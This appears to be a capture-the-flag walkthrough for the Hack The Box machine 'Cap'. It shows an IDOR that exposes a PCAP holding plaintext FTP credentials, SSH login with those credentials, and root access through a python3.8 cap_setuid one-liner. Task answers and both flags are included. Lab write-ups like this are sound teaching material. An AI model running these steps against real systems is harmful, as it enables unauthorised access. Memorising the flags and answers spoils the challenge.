@@ -1,0 +1,135 @@
+---
+tags: [web, linux, network]
+---
+# Cap
+
+- **Difficulty:** Easy
+- **Link:** [Cap](https://app.hackthebox.com/machines/Cap)
+
+## 🔎 Solution
+The first step is to enumerate the target using nmap:
+```
+> nmap -p- -sV --min-rate 5000 10.129.25.74
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The scan reveals three open ports: 21, 22, and 80.
+
+On port 80, accessing `http://<IP>:80` in the browser shows the web application. 
+In the sidebar, clicking on the second option "Security Snapshot (5 Second PCAP + Analysis)" redirects to `/data/1`.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./data.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+At this point, the application indicates we are viewing data associated with the user Nathan, so ID 1 likely corresponds to Nathan. 
+Trying different IDs is worth exploring. 
+Changing the endpoint to `/data/0` returns information for another user. 
+Downloading the PCAP file for ID 0 allows further analysis.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./data0.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Opening `0.pcap` in Wireshark reveals FTP traffic. 
+Since FTP is not encrypted, credentials are visible directly within the packets. 
+The extracted credentials are `nathan:Buck3tH4TF0RM3!`.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./pw.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Using these credentials to connect via SSH is successful. 
+After logging in, the first flag can be retrieved:
+```
+nathan@cap:~$ cat user.txt
+edcaf50a8fb972ea8557faba783233e3
+```
+
+With access as `nathan`, the next objective is privilege escalation to root. 
+Checking sudo permissions with `sudo -l` shows that this user cannot run any commands as root:
+```
+nathan@cap:~$ sudo -l
+[sudo] password for nathan:
+Sorry, user nathan may not run sudo on cap.
+```
+
+Since the system is Linux, linPEAS can be used to identify potential privilege escalation vectors. 
+First, download the script locally:
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+
+Then transfer it to the target machine:
+```
+scp linpeas.sh nathan@<IP>:/home/nathan
+```
+
+Make it executable and run it:
+```
+nathan@cap:~$ chmod +x ./linpeas.sh
+nathan@cap:~$ ./linpeas.sh
+```
+
+When reviewing linPEAS output, focus on findings highlighted in red with a yellow background, as these often indicate exploitable weaknesses.
+The scan reveals:
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./linpeas.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+This indicates that `python3.8` has the `cap_setuid` capability, which can be abused for privilege escalation. 
+By setting the UID to 0 (root), it is possible to spawn a root shell.
+
+A suitable payload can be found via [GTFOBins](https://gtfobins.org/gtfobins/python/#shell):
+```
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+```
+
+Executing the payload grants root access:
+```
+nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+# whoami
+root
+```
+
+With root privileges, navigate to the root directory and retrieve the final flag:
+```
+# cat root.txt
+d655a58a40b2b55b299e0f69c71d2f92
+```
+
+## ✏️ Task answers
+**Task 1: How many TCP ports are open?**
+> 3
+
+**Task 2: After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?**
+> data
+
+**Task 3: Are you able to get to other users' scans?**
+> Yes
+
+**Task 4: What is the ID of the PCAP file that contains sensative data?**
+> 0
+
+**Task 5: Which application layer protocol in the pcap file can the sensetive data be found in?**
+> FTP
+
+**Task 6: We've managed to collect nathan's FTP password. On what other service does this password work?**
+> SSH
+
+**Task 8: What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**
+> `/usr/bin/python3.8`
+
+## 🚩 Flag
+**User flag:**
+> `edcaf50a8fb972ea8557faba783233e3`
+
+**Root flag:**
+> `d655a58a40b2b55b299e0f69c71d2f92`
+
